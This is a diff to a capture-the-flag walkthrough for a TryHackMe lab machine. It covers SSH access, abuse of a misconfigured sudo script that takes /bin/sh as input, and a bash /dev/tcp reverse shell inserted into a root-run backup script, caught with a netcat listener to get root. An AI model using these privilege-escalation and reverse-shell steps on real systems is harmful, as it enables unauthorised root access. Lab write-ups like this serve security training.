@@ -141,7 +141,7 @@ the file's contents should look like this
 
 ![Contents of script.txt](./screenshots/14_.png)
 
-### SSH connection
+### SSH connection, First Flag
 
 now, while keeping in mind of which directory you're running the command the following command
 
@@ -149,6 +149,68 @@ now, while keeping in mind of which directory you're running the command the fol
 ssh -i [SSH File name] dale@team.thm
 ```
 
-you'll get access to dale's files, which when you navigate, you'll find your first flag.
+you'll get access to dale's files, which when you navigate, you'll find your first flag on user.txt.
 
 ![Contents of script.txt](./screenshots/16.png)
+
+### privilege escalation
+
+after scouring the files for a bit, you might find the user gyles on /home/gyles/, which contains one file, named admin_checks.
+
+you can also find the file using the command
+
+```bash
+sudo -l
+```
+
+now, if we print admin_checks, we see the following
+
+![Contents of script.txt](./screenshots/17.png)
+
+the process looks like a sudo -u process, which is what we'll be running now
+
+```bash
+sudo -u gyles /home/gyles/admin_checks
+```
+
+here, we're going to need credentials and a date, however, often times, systems have misconfigured sudo rights, which allows us to get the credentials right off of /bin/sh without even knowing them, which is  why we can simply type /bin/sh on each of the questions
+
+![Contents of script.txt](./screenshots/18.png)
+
+### setting the reverse shell
+
+we'll now spawn an interactive shell while on gyles, run the following command
+
+```bash
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+
+![Contents of script.txt](./screenshots/19.png)
+
+now go to /home/gyles and run ls -la, we will find a .bash_history file
+
+read through the file carefully, you'll eventually find a nano command on /usr/local/bin/main_backup.sh
+
+this can help us get root privileges 
+
+printing the file, we notice that it is extremely vulnerable, we will be replacing the line "cp -r /var/www/team.thm/* /var/backups/www/team.thm/ " pentest monkey bash reverse shell to get a reverse shell
+
+the format is the following:
+
+```bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+
+replace the ip with the ip that tryhackme gave you when you connected to the tryhackme VPN
+
+![Contents of script.txt](./screenshots/20.png)
+
+### Accessing reverse shell and root, Flag 2
+
+After changing main_backup.sh, open a separate terminal and run the following command:
+
+```bash
+nc -lvnp 8080
+```
+
+give it some time, you'll eventually connect to the reverse shell. Navigate using ls and congratulations! you've found root.txt, AKA the second flag. :)
